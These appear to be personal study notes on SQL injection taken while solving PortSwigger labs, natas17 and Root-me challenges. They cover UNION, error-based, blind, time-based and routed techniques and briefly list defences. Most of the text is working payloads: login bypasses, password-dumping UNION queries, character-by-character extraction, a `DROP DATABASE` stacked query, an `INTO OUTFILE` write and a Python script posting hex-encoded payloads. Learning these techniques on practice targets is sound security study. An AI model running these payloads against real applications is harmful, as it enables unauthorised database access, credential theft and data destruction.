# sqlInjection
* finding a functionality that at some point interacts with a database; then
  trying to get it to do other stuff than intended.

send something like `'` to every filed to see if it an error pops.

## test for sqli:

use `'` (indicating the end of the query) to check for anomalies. if
the app isn't protected it might trigger database errors or change
the logic of the query.

fuzzing: submitting sqli payloads and monitoring the response.
looking for clues that the injected code can be executed.

types:

classic:
  * error based: triggers error in the database to collect info `CONVERT((SELECT Password
    FROM Users WHERE Username="admin"), DATE);`
  * UNION based: concatenate anther query to the web app response.

blind: can't extract info because the application doesn’t return SQL
data or descriptive errors; so send sqli payloads and observe the
behaviour.

  * boolean based: injecting test conditions that return either true
    or false; slowly inferring the structure of the databse.
  * time based: focusing on response time difference of different
    payloads by triggering a time delay, so that if the delay occurs
    the query worked.

exfiltrate: store info somewhere on the local machine: `SELECT
Password FROM Users WHERE Username='admin' INTO OUTFILE
'/var/www/html/output.txt'`
* then you can access the file: `https://example.com/output.txt`

https://portswigger.net/web-security/sql-injection/cheat-sheet
## sql schemes

![sqlStructure](shots/sqlStructure.png)
![sqlStructure1](shots/sqlStructure1.png)

* in SQL use `--` to comment out the rest.
* every thing should be encoded:
  (this was in mysql)
  `uname=' OR 1=1 #`
  `uname='+OR+1%3d1+%23&psw="sdfsdfsdf"&btnLogin=Login`

  * `'` is to close the expected username string.
  * `OR 1=1 #` is always true.
  * password can be anything because it's escaped.
  * turns into:
  `SELECT * FROM users WHERE username = '' OR 1=1 # AND password = 'input_password';`
  * expected `';--` to also work but it was probably filtered.

* abusing UPDATE statement (maybe in changing password page).
* `WHERE eid = 'EID5002' #' and pass word= 'xyz'`: everything after `#` is a comment.

* In SQL, multiple statements, separated by semicolon (;), can be
  included in one statement string, but doesn't work in mysql.
  `
  SELECT Name, Salary, SSN
  FROM employee
  WHERE eid= 'a'; DROP DATABASE dbtest;
  `

* second order (stored) sqli: sometimes the payload can be kept in the database
  and called later.

* preventions:
  * prepared statements: so that the malicious part doesn't compile and
    treated as an string rather than an executable.
  * allow list
  * sanitize and escape user input


## example

* `SELECT * FROM products WHERE category = 'Gifts' AND released = 1` -> `SELECT * FROM products WHERE category = ''+OR+1=1-- AND released = 1`
  to get every category. in sql.

# UNION attack

if an application is vulnerable to SQL injection, and the results are returned
within the application's responses, you can use the `UNION` keyword to retrieve
*data from other tables*.

execute one or more additional SELECT queries and *append* the results to the
original query.

`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`
returns a single result set with two columns, containing a,b,c,d columns.

  * individual queries must return the same number of columns.
  * data types in each column must be compatible between the individual queries.

so you should test for:

  * How many columns are being returned from the original query.
  * Which columns returned from the original query are of a suitable data type
    to hold the results from the injected query

    it means if we want to get out something that is of type string, we should
    append it to a column in the original query that is of type string.


in UNION, the data types in each column must be the same between original and
injected queries, so we use `NULL`. if we are getting error (500) response,
it means there are more columns of data in the original query, so we have to
add more NULL columns to our injected one.

![UNION](shots/sqlUNION.png)

## how many columns are being returned form the original query?

using `ORDER BY` clause, incrementing the column index until error, indicating
there is no more.

`' ORDER BY 1--` ,2,3 and ....

using `UNION SELECT NULL --` and adding more. if the number of NULLs doesn't
match the number of columns, error occurs.

so we append this to the previous request: `'+UNION+SELECT+NULL,NULL--`

find which column is *compatible* with strings*: `'+UNION+SELECT+'abcdef',NULL,NULL--`, replace it with each NULL in turn.

in oracle, even if you are querying `NULL`, you must specify a valid table:`' UNION SELECT 'a','b' FROM dual--`

* in MySQL the `--` must be followed by a space.

you can get the version like this:`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

getting *table information* using UNION:

`'UNION SELECT table_name,NULL FROM information_schema.tables-- `

`table_schema = database()`: This restricts the query to only retrieve tables
from the current database.
`
'UNION+SELECT+column_name,NULL+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME+%3d+'users_lfcfpy'--
'UNION+SELECT+password_esrxvu,username_kpjwmf+FROM+users_lfcfpy--
`
oracle:
`
'UNION SELECT table_name,NULL FROM all_tables--
'UNION select column_name,NULL from ALL_TAB_COLUMNS where table_name='USERS_IMYMYY'-
`
get *two columns in one*:`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`

## SQL injection, using none obvious inputs 

you can do injection attacks using any user controllable input that is
processed as SQL query.

some websites take input in XML or JSON to query the database.

solution:

these formats may have some ways to bypass the protection against sql attacks.
you could do html hex encode to send a request. (using an XML escape sequence?
what is this?)

# blind SQLi

it's http responses do not contain the results of the relevant SQL query or the
details of db errors.

## exploit by triggering conditional responses

when application uses *tracking cookies* the application uses a SQL query to
determine if this is a known user:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

the results aren't returned to the user. but the application behaves
differently depending on the returned data. e.g. it might show a welcome back
message.

How to:

Using and `AND` condition, if it's true, the expected action would happen (a
welcome message will be displayed), other wise, it's not true.

`TrackingId=EGsveqHgcMpxwCB8' AND '1'='1;` this returns a welcome back message
`TrackingId=EGsveqHgcMpxwCB8' AND '1'='2;` this doesn't

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

this return a welcome back message indicating that the first character of
password is greater than `m`.

use `' AND (SELECT 'a' FROM users LIMIT 1) = 'a'--` to determine if the `users`
table exists. the rest will always be true, (a=a).

`LIMIT 1` because it cannot compare a set of results (multiple rows) to
a single value.

## bruteforce

Using SUBSTRING:

`SELECT SUBSTRING(password,{index},1) FROM users WHERE USERNAME='administrator') = '{c}' --`

you should check every index, one by one for the new character, not the appended value.

## Error-based SQL injection

use error messages to either extract or infer sensitive data from the database.
The possibilities depend on the configuration of the database and the types of
errors you're able to trigger.

### Exploiting blind SQL injection by triggering conditional errors

there are SQL queries but the app's behavior doesn't change, even if they return data.

so injecting boolean conditions (like previous part) doesn't change the app's responses.

induce a response depending on whether a SQL error occurs. modify the query to cause a database error on TRUE.

`xyz' AND (SELECT CASE WHEN (1=2) THEN ELSE 'a' END)='a`

`CASE` evaluates to `a`, no error.

`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

evaluates to `1/0`, which causes a divide-by-zero error.

`lzjS7' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL) = 'a'--`

    * `TO_CHAR` makes both branch conditions the same.
    * `END FROM dual` is also necessary in oracle:
        * `DUAL` is a sort of dummy table with one row in every oracle db.
        * `END` is the closing part of the condition.

to check the password length:

`' AND (SELECT CASE WHEN LENGTH(password) > 10 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a'--`

notice that the error means the condition is true. you can change it too.


so we can use injected conditions to retrieve data, testing one character at a time:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

AND the result of the subquery = 'a'.
subquery: if the first index is greater that 'm'.

### Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages that can contain useful information.

`CAST((SELECT example_column FROM example_table) AS int)` converts data types, if it's an incompatible type (string -> int) might cause an error, which could be useful to trigger *conditional responses*.

if there is a *character limitation*, you can't use too verbose (long?) queries.

HOW TO:

* commenting helps with eliminating the closing *quotation* that already exist
  in the application's code.

test it:

`' AND CAST((SELECT 1) AS INT) --` returns an error, because it expects a boolean, 1=1 (true)

`' AND 1=CAST((SELECT 1) AS INT) --` is true, so no error returned

`' AND 1=CAST((SELECT "abc") AS INT) --` error, returning `"abc"` because 

`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT) --`

remove the cookie because it's not needed and leaves us more characters.

`LIMT 1` so that it doesn't show too many rows.

AND we get an error: invalid input syntax for type integer: "administrator"

so we get the idea to : `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --`

using this stuff, you can get `version()` and all.


ERROR indicating *character limit*:

Unterminated string literal started at position 95 in SQL SELECT * FROM
tracking WHERE id = 'hyPr13PYPcOYmG05' AND CAST((SELECT password FROM users
where'. Expected  char

## by triggering time delays

in case of a database error, when the SQL query is executed and handles them
gracefully, there won't be any difference in the application's response

but, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false.

delaying the execution of a SQL query also delays the http response.

MS SQL:
trigger a delay depending on whether the expression is true:

`'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--`

Postgres sql:

`' || pg_sleep(10) --`

`||` is to concatenate the function to the query so that the function is called.


to move toward bruteforcing the  password:

`' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) else pg_sleep(0) END)--`

if true sleep, otherwise don't

you might be able to use `;` instead of `||` to end the previous query and
start a new one.

`("32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c)`
if the first index of the password is `c`, sleep, otherwise return immediately.
this doesn't have to be url encoded.

`'%3bSELECT+CASE+WHEN+(username%3d'administrator'+AND+SUBSTR(password,§1§,1)+%3d+'§a§')++THEN+pg_sleep(10)+else+pg_sleep(0)+END+FROM+users--`
`"32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c`

something like this also works in burpsuite but should be url encoded

### another example, natas17

this is the code, that get a query for `MySQL`:

`$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`

but in the rest of the code, the result isn't returned.

payload:

`natas18" AND IF((1=1),SLEEP(10),'a')#`

the `a` is the else part.

if natas18 is there, response will be delayed.

to get the included characters in the password:
in code: ``username := fmt.Sprintf(`natas18" AND IF(password LIKE BINARY "%%%c%%", SLEEP(10), 1)#`, c)``


% is used for formatting in Go, you need to escape it, which results in the
final query having %c%.
`%c%` in LIKE clause: wild card in SQL, meaning "any sequence of characters".

so it will be like this before sent to the server:
`natas18" AND IF((password LIKE BINARY "%S%"),SLEEP(10),"1")#`

and then to get the actual password, use `SUBSTR`.

## using out-of-band techniques

an app could carry out an SQL query *asynchronously*.

it uses the original thread to process the user's *request* and another to execute the query using the tracking cookie.

the app doesn't wait for the SQL query to return, it's response to user doesn't depend on it, be it an error or the delay.

the query could be vulnerable, but how do we know?

triggering the server to send DNS lookup query to our server.

# routed SQLi

the injectable query doesn't reflect, but the result is passed to another query.
you could use UNION SELECT but nothing is appended to the result.

`$query = "SELECT id, sec_code FROM users WHERE id='1' and false union select 1,2--"`

`$result = mysqli_query($conn, $query);

$row = mysqli_fetch_array($result, MYSQLI_ASSOC);
$row2 = mysqli_fetch_array($result, MYSQLI_ASSOC);

print_r($row);
print_r($row2);

$query2 = "SELECT username FROM users WHERE sec_code='" . $row['sec_code'] . "'";`

`mysqli_fetch_array` gets one row at a time.

so we could use `and false`: results in the first query not being considered at all and using
just returning one row, containing the second values.

if there isn't a `sec_code` = 2 in the `users` table we won't get an output.

whatever we put in place of `2` in the first query will be injected into the second one.

Chaining query1 to: we will first *encode* the query to HEX, then add `0x` in the
payload so that it is interpreted correctly by MySQL.

`$query = "SELECT id, sec_code FROM users WHERE id='1' and false union select 1,0x27206f72207472756523--";`

which in the `print_r($row)` is interpreted like:

`(
    [id] => 1
    [sec_code] => ' or true#
)`

so with this, the second query will return.

the next step:
`$query = "SELECT id, sec_code FROM users WHERE id='1' and false union select 1,0x2720756e696f6e2073656c656374203223--";1`
``
(
    [id] => 1
    [sec_code] => ' union select 2#
)
``
so we will finally have `2` reflected in the output.

## Root-me routed

testing:

`login=admin' order by 1-- ` attack detected
`login=admin' union select NULL--` 
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
`login=admin' union select 1-- `
[+] Requested login: admin' union select 1--
[+] Found ID: 3
[+] Email: admin@sqli_me.com
`login=admin' union select NULL-- `
[+] Requested login: admin' union select NULL--
[+] Found ID: 3
[+] Email: admin@sqli_me.com

this means the payload will be reflected.

Another number or NULL, results in "attack detected".

`and false` too.

you should consider that you have to *put a `" "` or `+` character after comment in MySQL*.

to check how many columns the second query returns using HEXed`' union select order by 2-- `:
`login=' union select 0x27206f726465722062792032202d2d20-- `
[+] Requested login: ' union select 0x27206f726465722062792032202d2d20--
[+] Found ID:
[+] Email:
`login=' union select 0x27206f726465722062792033202d2d20-- ` by 3--
Unknown column '3' in 'order clause'

* not sending "admin", seems to make a difference on receiving the error,
  something like what `and false` did. the first query wouldn't return so the
  second one would. so I think I should have entered it in the first place.

get the *database version* using `'UNION SELECT @@version ,NUll-- `:
`' union select 0x27554e494f4e2053454c45435420404076657273696f6e202c4e556c6c2d2d20-- `
[+] Requested login: ...
[+] Found ID: 8.0.36
[+] Email:

get *table name* `'UNION SELECT 1,table_name FROM information_schema.tables-- ` (cleaner to be like this, compared to above request):
`login=' union select 0x27554e494f4e2053454c45435420312c7461626c655f6e616d652046524f4d20696e666f726d6174696f6e5f736368656d612e7461626c65732d2d20-- `
[+] Requested login: ... 
[+] Found ID: 1
[+] Email: users

to get every column, we should get one row at a time, so `limit 0,1` and others:
`' union select 1,column_name from information_schema.columns where table_name='users' limit 2,1-- `
[+] Requested login: ...
[+] Found ID: 1
[+] Email: password

and then `' union select id, password from users where id=3 -- ` to get the passowrd.

* another solutions instead of `limit`: 
  `' union select ' union select 1,concat(login,password) from users -- - -- -`
the end dashed are just for spaces.

and instead of manually trying all these:
`
import binascii
#y=binascii.hexlify(b'asdf')

origin=b"3 union select table_name from information_schema.tables limit 1 offset 1"
origin=b"4' union select 1,table_name from information_schema.tables where table_schema = database() limit 0,1 -- "
origin=b"4' union select 1,column_name from information_schema.columns where table_name='users' limit 2,1 -- "
origin=b"4' union select id, password from users where id=3 limit 0,1-- "
payload=str(binascii.hexlify(origin),'ascii')
datas={"login":f"' union select 0x{payload} -- "}
re=requests.post(url="http://challenge01.root-me.org/web-serveur/ch49/index.php?action=search",data=datas,verify=False)

print(re.text)
`

## routed
a really interesting part of the solution: `-3' UNION SELECT SLEEP(6),1 --`
it seems it used `-3` to falsify the first query.

Interesting stuff `' UNIon SELect 1,(SELect GROup_CONcat(CONcat(id,0x3a,login,0x3a,password,0x3a,email) SEParator '<br>') FROm users)-- - `

## Root-Me authentication v 0.01

login=' OR 1=1 # &password=2

SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &quot;#&quot; in <b>/challenge/web-serveur/ch9/index.php</b> on line <b>38</b><br />

login=' OR 1=1 -- &password=2

Welcome back user1 !</h2><h3>Your informations :</h3><p>- username : <input type="text" value="user1" disabled /><br/>- password : <input type="password" value="TYsgv75zgtq" disabled /></p>


login='OR 3=3  &password=5

<b>Warning</b>:  SQLite3::query(): Unable to prepare statement: 1, near &quot;' and password='&quot;: syntax error in <b>/challenge/web-serveur/ch9/index.php</b> on line <b>38</b><br />
near "' and password='": syntax error


### why are we able to login as `user1`?

login=' ORDER BY 3-- &password=5

<b>Warning</b>:  SQLite3::query(): Unable to prepare statement: 1, 1st ORDER BY term out of range - should be between 1 and 2 in <b>/challenge/web-serveur/ch9/index.php</b> on line <b>38</b><br />
1st ORDER BY term out of range - should be between 1 and 2

login=user1'UNION SELECT NULL,NULL limit 0,1--&password=5

this again returns NULL for the credentials, (with or without `limit 0,1`.
but with `limit 2,1` we will have the credentials for `user1`.

and then:

`login=admin'UNION SELECT NULL,NULL limit 1,2-- &password=5`

returns `admin`'s creds.

in all of these an empty password returns an error.

#### Other payloads:

* you can use `;` to end the query.

admin';%00

' OR '2'='2' AND username NOT LIKE '%user1%

admin' --

' or 1=1;
' or ( 1=1 and username='admin');

admin'or '1'='0' --

' or 'x'='x' order by 1 asc --

`
aa' UNION SELECT count(*), users.password FROM users; --
Then, i’ve just tried all 3 passwords:

aa' UNION SELECT users.password, users.password FROM users LIMIT 1; --
aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 1; --
aa' UNION SELECT users.password, users.password FROM users LIMIT 1 OFFSET 2; --
if you guessed the username column, this will do:

aa' UNION SELECT users.password, users.password FROM users WHERE username='admin';--
`

`admin'; select * from users; -- `

login:foobar'&password:' OR username='admin

# tips

if you enter `'` in a search field and get it back in the result, it has been escaped and
isn't considered as a special character.
